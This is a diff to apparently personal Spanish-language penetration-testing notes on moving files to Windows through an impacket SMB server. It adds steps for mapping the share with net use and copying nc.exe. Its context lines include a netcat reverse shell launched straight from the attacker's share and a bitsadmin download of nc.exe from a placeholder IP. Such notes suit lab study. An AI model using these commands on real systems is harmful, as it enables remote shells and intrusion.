@@ -49,6 +49,7 @@ C:\Users\Public
 
 4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support -username omar -password omar123
    # Con credenciales → cuando Windows bloquea conexiones SMB anónimas
+   # El user y la passwd son inventadas (No importa)
 
 
 EXTRA:
@@ -73,8 +74,14 @@ EXTRA:
    ❯ \\<IP>\smbFolder\nc.exe -e cmd <IP> 443
    # Ejecutar directamente desde el SMB sin copiar al disco
 
-4 ❯ net use \\IP\smbFolder /u:omar omar123
+4 ❯ net use x: \\IP\smbFolder /u:omar omar123
    # En Windows colocar las credenciales para hacer la transferencia
+   # Se debe de copiar todo el folder y no por archivo  
+   # Al solo hacer 'dir' no mostrará el volúmen pero si existirá
+  ❯ dir x:\    # Mirar el contenido que se ha compartido 
+  ❯ copy x:\nc.exe nc.exe   # Copiar el archivo de la unidad hacia el dir 
+  ❯ net use * /delete       # Terminar la conexión autenticada 
+
 
 EXTRA:
    ❯ bitsadmin /transfer job http://<IP>/nc.exe C:\Temp\nc.exe
